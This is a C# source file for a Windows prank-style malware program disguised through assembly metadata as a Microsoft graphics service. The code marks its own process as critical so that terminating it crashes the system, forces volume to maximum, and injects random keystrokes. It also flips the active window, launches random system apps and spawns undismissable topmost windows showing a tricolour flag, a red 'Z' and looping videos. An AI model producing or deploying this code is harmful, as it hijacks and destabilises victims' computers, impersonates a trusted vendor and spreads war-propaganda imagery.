using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms.Integration;
using System.Windows.Controls;

[assembly: AssemblyTitle("System Host for Advanced Graphics Services")]
[assembly: AssemblyDescription("System Host for Advanced Graphics Services")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyProduct("Windows Operating System")]
[assembly: AssemblyCopyright("Copyright (c) Microsoft Corporation. All rights reserved.")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("e5c18492-f224-4bd4-a38d-1d4e8c679902")]
[assembly: AssemblyVersion("6.6.6.6")]
[assembly: AssemblyFileVersion("6.6.6.6")]
[assembly: AssemblyInformationalVersion("FUCK YOU")]

namespace SystemGraphicsProvider
{
    public enum EffectType { Flag, SymbolZ }

    [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator
    {
        int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices);
        [PreserveSig] int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
    }

    [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice
    {
        [PreserveSig] int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioEndpointVolume ppInterface);
    }

    [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioEndpointVolume
    {
        int RegisterControlChangeNotify(IntPtr pNotify);
        int UnregisterControlChangeNotify(IntPtr pNotify);
        int GetChannelCount(out int pnChannelCount);
        [PreserveSig] int SetMasterVolumeLevel(float fLevelDB, ref Guid pguidEventContext);
        [PreserveSig] int SetMasterVolumeLevelScalar(float fLevel, ref Guid pguidEventContext);
        [PreserveSig] int GetMasterVolumeLevel(out float pfLevelDB);
        [PreserveSig] int GetMasterVolumeLevelScalar(out float pfLevel);
    }

    [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    class MMDeviceEnumeratorComObject { }

    public static class WallpaperManager
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lvParam, int fuWinIni);

        public static void SetWallpaper(string filePath)
        {
            try
            {
                if (File.Exists(filePath)) SystemParametersInfo(20, 0, filePath, 3);
            }
            catch { }
        }
    }

    public static class MediaManager
    {
        [DllImport("winmm.dll")]
        private static extern long mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hwndCallback);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern int GetShortPathName(string lpszLongPath, StringBuilder lpszShortPath, int cchBuffer);

        public static string GetShortPath(string longPath)
        {
            StringBuilder shortPathBuilder = new StringBuilder(255);
            GetShortPathName(longPath, shortPathBuilder, shortPathBuilder.Capacity);
            return shortPathBuilder.ToString();
        }

        public static void PlayBackgroundMp3(string filePath)
        {
            try
            {
                if (!File.Exists(filePath)) return;
                string shortPath = GetShortPath(filePath);
                mciSendString("open " + shortPath + " type mpegvideo alias bgmusic", null, 0, IntPtr.Zero);
                mciSendString("play bgmusic repeat", null, 0, IntPtr.Zero);
            }
            catch { }
        }

        public static void StopAll()
        {
            try { mciSendString("stop bgmusic", null, 0, IntPtr.Zero); mciSendString("close bgmusic", null, 0, IntPtr.Zero); } catch { }
        }
    }

    public static class SystemChaosTweaker
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        private static readonly Random _rnd = new Random();

        private const byte VK_MENU = 0x12;  
        private const byte VK_TAB = 0x09;   
        private const byte VK_LWIN = 0x5B;  
        private const byte VK_D = 0x44;     
        private const byte KEYEVENTF_KEYUP = 0x0002; 

        private static readonly string[] SystemApps = new string[]
        {
            "control color", "msra", "calc", "notepad", "write", "mspaint", 
            "cleanmgr", "charmap", "dxdiag", "magnify", "osk", 
            "compmgmt.msc", "devmgmt.msc", "diskmgmt.msc", "eventvwr.msc", 
            "winver", "dialer", "eudcedit", "mobsync", "shrpubw", 
            "joy.cpl", "telephon.cpl", "dpiscaling",
            "sol", "freecell", "msheart", "spider", "minesweeper"
        };

        public static void LaunchRandomSystemApp()
        {
            try
            {
                int index = _rnd.Next(0, SystemApps.Length);
                string command = SystemApps[index];

                ProcessStartInfo psi = new ProcessStartInfo();
                if (command.EndsWith(".msc"))
                {
                    psi.FileName = "mmc.exe";
                    psi.Arguments = command;
                }
                else
                {
                    int spaceIndex = command.IndexOf(' ');
                    if (spaceIndex > 0)
                    {
                        psi.FileName = command.Substring(0, spaceIndex);
                        psi.Arguments = command.Substring(spaceIndex + 1);
                    }
                    else { psi.FileName = command; }
                }
                psi.UseShellExecute = true;
                Process.Start(psi);
            }
            catch { }
        }

        public static void MessWithActiveWindow()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                if (hwnd == IntPtr.Zero) return;

                int decision = _rnd.Next(0, 2);
                if (decision == 0) ShowWindow(hwnd, 6); 
                else ShowWindow(hwnd, 3); 
            }
            catch { }
        }

        public static void PressRandomKey()
        {
            try
            {
                int ActionType = _rnd.Next(0, 10);

                if (ActionType == 0) 
                {
                    keybd_event(VK_MENU, 0, 0, UIntPtr.Zero);
                    keybd_event(VK_TAB, 0, 0, UIntPtr.Zero);
                    Thread.Sleep(50);
                    keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                }
                else if (ActionType == 1)
                {
                    keybd_event(VK_LWIN, 0, 0, UIntPtr.Zero);
                    keybd_event(VK_D, 0, 0, UIntPtr.Zero);
                    Thread.Sleep(50);
                    keybd_event(VK_D, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                }
                else
                {
                    byte randomKey = (byte)_rnd.Next(0x41, 0x5B);
                    keybd_event(randomKey, 0, 0, UIntPtr.Zero);
                    keybd_event(randomKey, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                }
            }
            catch { }
        }
    }

    public class ChaoticWindow : Form
    {
        private readonly System.Windows.Forms.Timer _loopTimer;
        private readonly Random _random;
        private readonly EffectType _type;
        private int _velocityX;
        private int _velocityY;
        private double _waveAngle;
        private Font _zFont;

        protected override bool ShowWithoutActivation { get { return true; } }
        protected override CreateParams CreateParams
        {
            get { var cp = base.CreateParams; cp.ExStyle |= 0x80 | 0x8000000; return cp; }
        }

        public ChaoticWindow(EffectType type)
        {
            _random = new Random(Guid.NewGuid().GetHashCode());
            _type = type;

            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false; 
            this.TopMost = true; 
            this.Size = new Size(450, 280);
            this.StartPosition = FormStartPosition.Manual;
            this.DoubleBuffered = true;

            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            this.Left = _random.Next(0, screenWidth - this.Width);
            this.Top = _random.Next(0, screenHeight - this.Height);

            _velocityX = _random.Next(-7, 8);
            _velocityY = _random.Next(-7, 8);
            if (_velocityX == 0) _velocityX = 4;
            if (_velocityY == 0) _velocityY = -4;

            if (_type == EffectType.SymbolZ) _zFont = new Font("Impact", 160, FontStyle.Bold);

            _loopTimer = new System.Windows.Forms.Timer { Interval = 16 };
            _loopTimer.Tick += (s, e) => {
                this.Left += _velocityX; this.Top += _velocityY;
                if (this.Left <= 0 || this.Left + this.Width >= screenWidth) _velocityX = -_velocityX;
                if (this.Top <= 0 || this.Top + this.Height >= screenHeight) _velocityY = -_velocityY;
                _waveAngle += 0.2; this.Invalidate();
            };
            _loopTimer.Start();
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            if (_type == EffectType.Flag)
            {
                int stripe = this.Height / 3;
                using (Bitmap flagBmp = new Bitmap(this.Width + 60, this.Height))
                using (Graphics gFlag = Graphics.FromImage(flagBmp))
                {
                    gFlag.FillRectangle(Brushes.White, 0, 0, flagBmp.Width, stripe);
                    gFlag.FillRectangle(Brushes.Blue, 0, stripe, flagBmp.Width, stripe);
                    gFlag.FillRectangle(Brushes.Red, 0, stripe * 2, flagBmp.Width, stripe);

                    for (int y = 0; y < this.Height; y += 2)
                    {
                        int xOffset = (int)(Math.Sin(_waveAngle + (y / 20.0)) * 15.0);
                        g.DrawImage(flagBmp, new Rectangle(0, y, this.Width, 2), new Rectangle(20 + xOffset, y, this.Width, 2), GraphicsUnit.Pixel);
                    }
                }
            }
            else if (_type == EffectType.SymbolZ)
            {
                g.Clear(Color.Black);
                g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAlias;
                SizeF textSize = g.MeasureString("Z", _zFont);
                g.DrawString("Z", _zFont, Brushes.Red, (this.Width - textSize.Width) / 2, (this.Height - textSize.Height) / 2);
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing) { if (_loopTimer != null) _loopTimer.Dispose(); if (_zFont != null) _zFont.Dispose(); }
            base.Dispose(disposing);
        }
    }

    public class ChaoticVideoWindow : Form
    {
        private readonly System.Windows.Forms.Timer _moveTimer;
        private readonly Random _random;
        private ElementHost _ctrlHost;
        private MediaElement _mediaPlayer;
        private int _velocityX;
        private int _velocityY;

        protected override bool ShowWithoutActivation { get { return true; } }
        protected override CreateParams CreateParams
        {
            get { var cp = base.CreateParams; cp.ExStyle |= 0x80 | 0x8000000; return cp; }
        }

        public ChaoticVideoWindow(string videoPath)
        {
            _random = new Random(Guid.NewGuid().GetHashCode());

            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.Size = new Size(400, 300); 
            this.StartPosition = FormStartPosition.Manual;
            this.BackColor = Color.Black;

            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            this.Left = _random.Next(0, screenWidth - this.Width);
            this.Top = _random.Next(0, screenHeight - this.Height);

            _velocityX = _random.Next(-6, 7);
            _velocityY = _random.Next(-6, 7);
            if (_velocityX == 0) _velocityX = 4;
            if (_velocityY == 0) _velocityY = -4;

            try
            {
                _ctrlHost = new ElementHost { Dock = DockStyle.Fill };
                _mediaPlayer = new MediaElement();
                _mediaPlayer.Source = new Uri(videoPath);
                _mediaPlayer.LoadedBehavior = MediaState.Play;
                _mediaPlayer.UnloadedBehavior = MediaState.Manual;
                _mediaPlayer.Stretch = System.Windows.Media.Stretch.Fill;
                _mediaPlayer.IsMuted = false;

                _mediaPlayer.MediaEnded += (s, e) => {
                    _mediaPlayer.Position = TimeSpan.Zero;
                    _mediaPlayer.Play();
                };

                _ctrlHost.Child = _mediaPlayer;
                this.Controls.Add(_ctrlHost);
            }
            catch { }

            _moveTimer = new System.Windows.Forms.Timer { Interval = 16 };
            _moveTimer.Tick += (s, e) => {
                this.Left += _velocityX; 
                this.Top += _velocityY;
                
                if (this.Left <= 0 || this.Left + this.Width >= screenWidth) _velocityX = -_velocityX;
                if (this.Top <= 0 || this.Top + this.Height >= screenHeight) _velocityY = -_velocityY;
            };
            _moveTimer.Start();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (_moveTimer != null) _moveTimer.Dispose();
                if (_mediaPlayer != null) { _mediaPlayer.Stop(); }
                if (_ctrlHost != null) _ctrlHost.Dispose();
            }
            base.Dispose(disposing);
        }
    }

    public class HiddenForm : Form
    {
        protected override void SetVisibleCore(bool value) { base.SetVisibleCore(false); }
    }

    class Program
    {
        // can be changed. true/false to enable/disable protection
        private static bool enableProcessProtection = true;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr Handle, int processInformationClass, ref int processInformation, int processInformationLength);

        private static System.Windows.Forms.Timer _flowTimer;
        private static System.Windows.Forms.Timer _chaosTimer;
        private static System.Windows.Forms.Timer _sysAppTimer;
        private static System.Windows.Forms.Timer _videoSpawnTimer; 
        private static System.Windows.Forms.Timer _volumeTimer; 
        private static Random _random;
        private static int _stage = 0;

        private static string[] _extractedVideoPaths = new string[3];

        private static IAudioEndpointVolume _audioVolumeControl = null;
        private static Guid _volumeContext = Guid.Empty;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            _random = new Random();

            if (enableProcessProtection)
            {
                try
                {
                    Process.EnterDebugMode();
                    int isCritical = 1;
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
                }
                catch { }
            }

            IMMDeviceEnumerator enumerator = null;
            IMMDevice device = null;
            try
            {
                enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                int hr = enumerator.GetDefaultAudioEndpoint(0, 0, out device);
                Marshal.ThrowExceptionForHR(hr);

                Guid IID_IAudioEndpointVolume = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
                hr = device.Activate(ref IID_IAudioEndpointVolume, 1, IntPtr.Zero, out _audioVolumeControl);
                Marshal.ThrowExceptionForHR(hr);
            }
            catch { }

            string tempAudioPath = ExtractResource("AudioTrack", "music.mp3");
            string tempWallpaperPath = ExtractResource("WallpaperImg", "bg.jpg");

            _extractedVideoPaths[0] = ExtractResource("VideoRes1", "video1.mp4");
            _extractedVideoPaths[1] = ExtractResource("VideoRes2", "video2.mp4");
            _extractedVideoPaths[2] = ExtractResource("VideoRes3", "video3.mp4");

            MediaManager.PlayBackgroundMp3(tempAudioPath);
            WallpaperManager.SetWallpaper(tempWallpaperPath);

            SpawnRandomGuiWindow();

            _flowTimer = new System.Windows.Forms.Timer { Interval = 15000 };
            _flowTimer.Tick += FlowTimer_Tick;
            _flowTimer.Start();

            _chaosTimer = new System.Windows.Forms.Timer { Interval = 100 };
            _chaosTimer.Tick += (s, e) => {
                if (_random.Next(0, 2) == 0) SystemChaosTweaker.MessWithActiveWindow();
                else SystemChaosTweaker.PressRandomKey();
            };
            _chaosTimer.Start();

            _sysAppTimer = new System.Windows.Forms.Timer { Interval = 3000 };
            _sysAppTimer.Tick += (s, e) => SystemChaosTweaker.LaunchRandomSystemApp();
            _sysAppTimer.Start();

            _videoSpawnTimer = new System.Windows.Forms.Timer { Interval = 8000 };
            _videoSpawnTimer.Tick += (s, e) => SpawnRandomVideoWindow();
            _videoSpawnTimer.Start();

            _volumeTimer = new System.Windows.Forms.Timer { Interval = 100 };
            _volumeTimer.Tick += VolumeTimer_Tick;
            _volumeTimer.Start();

            Application.Run(new HiddenForm());

            MediaManager.StopAll();
        }

        private static void VolumeTimer_Tick(object sender, EventArgs e)
        {
            if (_audioVolumeControl == null) return;
            try
            {
                float currentVolume = 0.0f;
                int hr = _audioVolumeControl.GetMasterVolumeLevelScalar(out currentVolume);
                
                if (hr == 0 && currentVolume < 1.0f)
                {
                    _audioVolumeControl.SetMasterVolumeLevelScalar(1.0f, ref _volumeContext);
                }
            }
            catch { }
        }

        private static string ExtractResource(string resourceName, string fileName)
        {
            try
            {
                string fullPath = Path.Combine(Path.GetTempPath(), fileName);
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (stream == null) return string.Empty;
                    using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }
                }
                return fullPath;
            }
            catch { return string.Empty; }
        }

        private static void FlowTimer_Tick(object sender, EventArgs e)
        {
            if (_stage == 0)
            {
                SpawnRandomGuiWindow();
                _flowTimer.Interval = 5000; 
                _stage = 1;
            }
            else { SpawnRandomGuiWindow(); }
        }

        private static void SpawnRandomGuiWindow()
        {
            EffectType randomType = (EffectType)_random.Next(0, 2);
            ChaoticWindow win = new ChaoticWindow(randomType);
            win.Show();
        }

        private static void SpawnRandomVideoWindow()
        {
            int randomIdx = _random.Next(0, 3);
            string chosenVideoPath = _extractedVideoPaths[randomIdx];

            if (!string.IsNullOrEmpty(chosenVideoPath) && File.Exists(chosenVideoPath))
            {
                ChaoticVideoWindow vidWin = new ChaoticVideoWindow(chosenVideoPath);
                vidWin.Show();
            }
        }
    }
}